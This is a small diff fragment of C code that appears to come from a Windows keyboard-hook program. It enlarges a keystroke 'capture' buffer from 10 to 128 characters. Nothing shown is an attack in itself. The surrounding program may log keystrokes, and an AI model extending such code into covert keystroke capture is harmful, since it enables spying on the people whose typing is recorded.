@@ -6,8 +6,8 @@
 
 HHOOK hHook = { NULL };
 
-#define N 10
-char capture[N] = "\0";
+#define N 128
+char capture[N];
 int captureLength = 0;
 
 enum Keys {
